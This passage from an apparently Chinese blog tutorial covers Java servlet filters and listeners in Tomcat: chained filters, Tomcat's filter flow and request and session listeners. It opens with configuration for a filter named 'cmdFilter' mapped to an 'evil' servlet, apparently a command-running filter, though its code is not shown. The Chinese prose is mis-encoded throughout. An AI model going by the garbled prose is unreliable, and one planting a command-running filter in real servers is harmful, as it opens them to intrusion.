<p>ç„¶åå°†å…¶æ‰“åŒ…æˆ <code>jar</code> æ”¾åˆ°å¯¹åº”ç›®å½•ï¼Œå†æ›´æ”¹ <code>web.xml</code> å†…å®¹å¦‚ä¸‹ğŸ‘‡</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>cmdFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>custom.cmdFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>name<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>dq<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>cmdFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>evil<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å½“ç„¶ï¼Œå¦‚æœ <code>servlet3.0+</code> å¯ä»¥ç”¨ä»¥ä¸‹ä»£ç ç­‰ä»·ä¸Šé¢çš„é…ç½®ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebFilter(filterName = &quot;cmdFilter&quot;, value = &#123;&quot;*.jsp&quot;, &quot;/evil&quot;&#125;, initParams = &#123;@WebInitParam(name = &quot;name&quot;, value = &quot;dq&quot;)&#125;)</span></span><br></pre></td></tr></table></figure>
<p>é…ç½®å¥½åè®¿é—®ç›¸åº”çš„é¡µé¢ï¼Œå¦‚è®¿é—® <code>a_evil.jsp</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241156368.png" alt="image-20220224115649221"></p>
<p>ä»¥åŠè®¿é—® <code>evil</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241207511.png" alt="image-20220224120707392"></p>
<h5 id="å¤šä¸ªè¿‡æ»¤å™¨">- å¤šä¸ªè¿‡æ»¤å™¨ -</h5>
<p>å½“ç„¶ï¼Œç”±äºå¯¹è¿‡æ»¤å™¨çš„è°ƒç”¨ç±»ä¼¼ä¸€ä¸ªé“¾è¡¨ï¼Œé‚£ä¹ˆæ˜¯å¯ä»¥æŒ‰ç…§é¡ºåºæ¥æ‰§è¡Œæ•°ä¸ªè¿‡æ»¤å™¨çš„ï¼Œæ¯”å¦‚å‡è‹¥æƒ³å®ç°ä»¥ä¸‹åŠŸèƒ½ğŸ‘‡</p>
<ul>
<li><code>è¿‡æ»¤å™¨A</code>
<ul>
<li>å½“å®¢æˆ·ç«¯è®¿é—® <code>*.jsp</code> é¡µé¢æ—¶è¾“å‡ºå°†è®¿é—® <code>ip</code> è¾“å‡º</li>
<li>å°†å®¢æˆ·ç«¯è¯·æ±‚çš„éƒ¨åˆ†æ•°æ®æ‰“åŒ…å‘ç»™ä¸‹ä¸€ä¸ª <code>è¿‡æ»¤å™¨B</code></li>
</ul>
</li>
<li><code>è¿‡æ»¤å™¨B</code>
<ul>
<li>å°†ä» <code>è¿‡æ»¤å™¨A</code> æ‰“åŒ…çš„æ•°æ®è¾“å‡ºå‡ºæ¥</li>
</ul>
</li>
</ul>
<p>æœ‰å…³ <code>è¿‡æ»¤å™¨A</code> çš„ä»£ç ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AFilter</span> <span class="keyword">implements</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">Filter</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        Filter.<span class="keyword">super</span>.init(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String userIP = servletRequest.getRemoteAddr();</span><br><span class="line">        String userAgent = ((HttpServletRequest) servletRequest).getHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line"></span><br><span class="line">        servletResponse.getWriter().write(String.join(<span class="string">&quot;&lt;br&gt;&quot;</span>,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;- Filter A -&quot;</span>,userIP,<span class="string">&quot;- END -&quot;</span>,<span class="string">&quot;&quot;</span>&#125;));</span><br><span class="line"></span><br><span class="line">        servletRequest.setAttribute(<span class="string">&quot;IP&quot;</span>,userIP);</span><br><span class="line">        servletRequest.setAttribute(<span class="string">&quot;UA&quot;</span>,userAgent);</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æœ‰å…³ <code>è¿‡æ»¤å™¨B</code> çš„ä»£ç ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BFilter</span> <span class="keyword">implements</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">Filter</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        Filter.<span class="keyword">super</span>.init(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String userIP = (String) servletRequest.getAttribute(<span class="string">&quot;IP&quot;</span>);</span><br><span class="line">        String userAgent = (String) servletRequest.getAttribute(<span class="string">&quot;UA&quot;</span>);</span><br><span class="line"></span><br><span class="line">        servletResponse.getWriter().write(String.join(<span class="string">&quot;&lt;br&gt;&quot;</span>,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;- Filter B -&quot;</span>,userIP, userAgent,<span class="string">&quot;- END -&quot;</span>&#125;));</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æœ‰å…³ <code>ABFilter.jsp</code> é¡µé¢å†…å®¹ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ABFilter&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%=<span class="string">&quot;&lt;br&gt; - ABFilter Page -&quot;</span>%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>ä»¥åŠ <code>web.xml</code> å†…å®¹ğŸ‘‡</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>custom.AFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>BFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>custom.BFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>BFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241229092.png" alt="image-20220224122928987"></p>
<p>æ­¤æ—¶å¾—åˆ°å“åº”æ˜¾ç¤ºé¡ºåºä¸º <code>è¿‡æ»¤å™¨A</code> =&gt; <code>è¿‡æ»¤å™¨B</code> =&gt; <code>é¡µé¢</code> ã€‚</p>
<h4 id="filterå’Œtomcatè¿‡ç¨‹">- filterå’Œtomcatè¿‡ç¨‹ -</h4>
<p>â‘  <code>tomcat</code> æœåŠ¡å™¨åœ¨å¯åŠ¨æ—¶å…ˆå®ä¾‹åŒ–æ‰€æœ‰ <code>è¿‡æ»¤å™¨</code> ï¼Œå¹¶è°ƒç”¨å…¶ <code>init</code> æ–¹æ³•</p>
<p>â‘¡ <code>å®¢æˆ·ç«¯</code> å‘ <code>tomcat</code> æœåŠ¡å™¨ä¸Šçš„ <code>jsp</code> å‘é€ <code>http</code> è¯·æ±‚</p>
<p>â‘¢ <code>tomcat</code> å®¹å™¨å°†ä» <code>å®¢æˆ·ç«¯</code> å‘æ¥çš„ <code>http</code> è¯·æ±‚å°è£…æˆ <code>ServletRequest</code> å¯¹è±¡</p>
<p>â‘£  <code>tomcat</code> å®¹å™¨å®ä¾‹åŒ–ä¸€ä¸ª <code>ServletResponse</code> å¯¹è±¡ç”¨ä½œå“åº”</p>
<p>â‘¤ <code>tomcat</code> æœåŠ¡å™¨æ ¹æ® <code>&lt;filter-mapping&gt;</code> å®šä¹‰çš„ <code>è¿‡æ»¤å™¨</code> é¡ºåºå°† <code>ServletRequest</code> å’Œ <code>ServletResponse</code> å¯¹è±¡ä½œä¸ºå‚æ•°è°ƒç”¨æ’åœ¨é¦–ä½çš„å®ä¾‹åŒ–å <code>è¿‡æ»¤å™¨</code> çš„ <code>doFilter</code> æ–¹æ³•</p>
<p>â‘¥ æ’åœ¨é¦–ä½ <code>è¿‡æ»¤å™¨</code> çš„ <code>doFilter</code> æ–¹æ³•ä¸­é€šè¿‡ <code>doFilter</code> æ–¹æ³•çš„è°ƒç”¨å°† <code>ServletRequest</code> å’Œ <code>ServletResponse</code> å¯¹è±¡ä¼ é€’ç»™ä¸‹ä¸€ä¸ª <code>è¿‡æ»¤å™¨</code> ï¼Œæœ€åä¸€ä¸ª <code>è¿‡æ»¤å™¨</code></p>
<p>â‘¦  <code>tomcat</code> æœåŠ¡å™¨ç”± <code>è¿‡æ»¤å™¨</code> å¤„ç†å¾—åˆ°çš„ <code>ServletRequest</code> å’Œ <code>ServletResponse</code> å¯¹è±¡ä¼ ç»™ <code>servlet</code> çš„å¯¹åº”æ–¹æ³•ï¼Œåé¢å°±æ˜¯ä¸€èˆ¬çš„å¤„ç†æµç¨‹äº†</p>
<h3 id="ç›‘å¬å™¨-listener">- ç›‘å¬å™¨(listener) -</h3>
<p>ç›‘å¬å™¨å³æ˜¯ <code>servlet</code> è§„èŒƒä¸­å®šä¹‰çš„ä¸€ç§ç‰¹æ®Šçš„ç±»ï¼Œç”¨ä»¥ç›‘å¬ç‰¹å®šçš„äº‹ä»¶(ç±»ä¼¼ <code>WorldEditor</code> ä¸­ <code>Trigger</code> çš„ <code>Event</code>)ï¼Œå¦‚åˆ›å»ºã€é”€æ¯ã€å¢åŠ ã€åˆ é™¤ã€ç»‘å®šç­‰ã€‚</p>
<h4 id="ç›‘å¬å™¨åˆ’åˆ†">- ç›‘å¬å™¨åˆ’åˆ† -</h4>
<p>æŒ‰ç…§ç›‘å¬å¯¹è±¡åˆ’åˆ†å¯ä»¥åˆ†ä¸ºğŸ‘‡</p>
<ul>
<li><code>SerletContext</code> =&gt; <code>SerletContextLisener</code></li>
<li><code>HttpSession</code> =&gt; <code>HttpSessionListener</code></li>
<li><code>ServletRequest</code> =&gt; <code>ServletRequestListener</code></li>
</ul>
<p>æŒ‰ç…§ç›‘å¬äº‹ä»¶å¯ä»¥åˆ’åˆ†ä¸ºğŸ‘‡</p>
<ol>
<li>
<p>ç›‘å¬åŸŸå¯¹è±¡è‡ªèº«çš„åˆ›å»ºå’Œé”€æ¯çš„äº‹ä»¶ç›‘å¬å™¨</p>
<ul>
<li>
<p><code>SerletContextListener</code></p>
<ul>
<li>
<p><code>contextInitialized()</code></p>
</li>
<li>
<p><code>contextDestroyed()</code></p>
</li>
</ul>
</li>
<li>
<p><code>HttpSessionListener</code></p>
<ul>
<li><code>sessionCreated()</code></li>
<li><code>sessionDestroyed()</code></li>
</ul>
</li>
<li>
<p><code>ServletRequestListener</code></p>
<ul>
<li><code>requestInitialized()</code></li>
<li><code>requestDestroyed()</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>ç›‘å¬åŸŸå¯¹è±¡ä¸­å±æ€§å˜åŠ¨çš„äº‹ä»¶ç›‘å¬å™¨</p>
<ul>
<li>
<p><code>ServletContextAttributeListener</code></p>
<ul>
<li>
<p><code>AttributeAdded()</code></p>
</li>
<li>
<p><code>AttributeRemoved()</code></p>
</li>
<li>
<p><code>AttributeReplaced()</code></p>
</li>
</ul>
</li>
<li>
<p><code>HttpSessionAttributeListener</code></p>
<ul>
<li>
<p><code>AttributeAdded()</code></p>
</li>
<li>
<p><code>AttributeRemoved()</code></p>
</li>
<li>
<p><code>AttributeReplaced()</code></p>
</li>
</ul>
</li>
<li>
<p><code>ServletRequestAttributeListener</code></p>
<ul>
<li>
<p><code>AttributeAdded()</code></p>
</li>
<li>
<p><code>AttributeRemoved()</code></p>
</li>
<li>
<p><code>AttributeReplaced()</code></p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>ç›‘å¬ç»‘å®šåˆ° <code>HttpSession</code> åŸŸä¸­æŸä¸ªå¯¹è±¡çŠ¶æ€çš„äº‹ä»¶ç›‘å¬å™¨</p>
<ul>
<li>
<p><code>HttpSessionBindingListener</code></p>
<ul>
<li><code>valueBound()</code></li>
<li><code>valueUnBound()</code></li>
</ul>
</li>
<li>
<p><code>HttpSessionActivationListener</code></p>
<ul>
<li><code>sessionWillPassivate()</code></li>
<li><code>sessionDidActivate()</code></li>
</ul>
</li>
</ul>
</li>
</ol>
<p>ç”¨ä¸€å¼ å›¾æ¥è¡¨ç¤º(æ‘˜è‡ª<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37651267/article/details/90962152">JSPçš„Webç›‘å¬å™¨</a>)ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241312415.jpeg" alt="img"></p>
<p>å¯è§ç›‘å¬å™¨å’Œè¿‡æ»¤å™¨ä¸€æ ·ï¼Œæ˜¯æœ‰é¡ºåºçš„ï¼Œä¸”å¯åŠ¨é¡ºåºå¤§äºè¿‡æ»¤å™¨å’Œ <code>servlet</code> ã€‚</p>
<h4 id="è‡ªå®šä¹‰ç›‘å¬å™¨">- è‡ªå®šä¹‰ç›‘å¬å™¨ -</h4>
<p>é‚£ä¹ˆä¸å¦¨ä»æŒ‰ç…§ç›‘å¬äº‹ä»¶åˆ’åˆ†çš„æ–¹æ³•ä¾æ¬¡å†™ä¸€ä¸ªä¾‹å­ã€‚</p>
<h5 id="åŸŸå¯¹è±¡è‡ªèº«çš„åˆ›å»ºå’Œé”€æ¯çš„äº‹ä»¶">- åŸŸå¯¹è±¡è‡ªèº«çš„åˆ›å»ºå’Œé”€æ¯çš„äº‹ä»¶ -</h5>
<p>è¿™é‡Œä»¥ <code>ServletRequest</code> å¯¹è±¡ä¸ºä¾‹ï¼Œå®ç°åœ¨è¯·æ±‚æ—¶æ˜¾ç¤ºä¼ å…¥çš„ <code>user-agent</code> è¯·æ±‚æ ‡å¤´å†…å®¹ï¼Œåœ¨é”€æ¯æ—¶æ˜¾ç¤ºæ‰€ä¼ å…¥çš„æ‰€æœ‰å‚æ•°å†…å®¹ã€‚</p>
<p>å…ˆæ˜¯ç›‘å¬å™¨ä»£ç ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">requestListener</span> <span class="keyword">implements</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">ServletRequestListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">        ServletRequestListener.<span class="keyword">super</span>.requestInitialized(sre);</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt; INIT &gt;&quot;</span>);</span><br><span class="line">        System.out.println(((HttpServletRequest) sre.getServletRequest()).getHeader(<span class="string">&quot;user-agent&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt; ==== &gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">        ServletRequestListener.<span class="keyword">super</span>.requestDestroyed(sre);</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt; DESTROY &gt;&quot;</span>);</span><br><span class="line">        Map&lt;String,String[]&gt; map = sre.getServletRequest().getParameterMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;String,String[]&gt; entry: map.entrySet())&#123;</span><br><span class="line">            String key =  entry.getKey();</span><br><span class="line">            String[] values = entry.getValue();</span><br><span class="line">            System.out.println(key + <span class="string">&quot;:\n&quot;</span> + String.join(<span class="string">&quot;|&quot;</span>,values));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt; ==== &gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å°†å…¶æ‰“åŒ…æˆ <code>jar</code> åæ”¾åˆ°æŒ‡å®šç›®å½•ï¼Œç„¶åæ˜¯ <code>web.xml</code> å†…å®¹ğŸ‘‡</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>custom.requestListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å½“ç„¶ï¼Œå¦‚æœ <code>servlet3.0+</code> ç›´æ¥ä½¿ç”¨æ³¨è§£ä¹Ÿå¯ä»¥ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br></pre></td></tr></table></figure>
<p>è®¿é—®ä»»æ„é¡µé¢å¹¶ä¼ å…¥å‚æ•°ï¼Œæ¯”å¦‚ <code>listener.jsp?a=1&amp;b=123&amp;b=321</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241352263.png" alt="image-20220224135224122"></p>
<p>å¦‚æœå†è®¿é—® <code>listener.jsp?c=10</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241353738.png" alt="image-20220224135328589"></p>
<p>å¯è§æ¯æ¬¡è¯·æ±‚éƒ½ä¼šå­˜åœ¨ <code>ServletRequest</code> å¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯ï¼Œå› è€Œä¹Ÿå°±ä¼šè¢«ç›‘å¬åˆ°ã€‚</p>
<h5 id="åŸŸå¯¹è±¡ä¸­å±æ€§å˜åŠ¨çš„äº‹ä»¶">- åŸŸå¯¹è±¡ä¸­å±æ€§å˜åŠ¨çš„äº‹ä»¶ -</h5>
<p>å†å†™ä¸€ä¸ªæœ‰å…³ <code>HttpSession</code> å¢åˆ æ”¹çš„ç›‘å¬å™¨ï¼Œå®ç°åœ¨å¢æ“ä½œæ—¶æ˜¾ç¤ºå¢çš„å€¼ï¼Œåœ¨è¿›è¡Œæ”¹å’Œåˆ æ“ä½œæ—¶åˆ¤æ–­æ‰€æ”¹åˆ çš„å€¼æ˜¯å¦ä¸ºç‰¹å®šå€¼ï¼Œè‹¥ä¸ä¸ºç‰¹å®šå€¼åˆ™è¾“å‡ºæ“ä½œè®°å½•ã€‚</p>
<p>å…ˆæ˜¯ç›‘å¬å™¨ä»£ç ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionAttributeListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionBindingEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">sessionListener</span> <span class="keyword">implements</span> <span class="title">HttpSessionAttributeListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">attributeAdded</span><span class="params">(HttpSessionBindingEvent se)</span> </span>&#123;</span><br><span class="line">        HttpSessionAttributeListener.<span class="keyword">super</span>.attributeAdded(se);</span><br><span class="line">        System.out.println(<span class="string">&quot;ADD -&gt; &quot;</span> + se.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;VALUE -&gt; &quot;</span> + se.getValue());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">attributeReplaced</span><span class="params">(HttpSessionBindingEvent 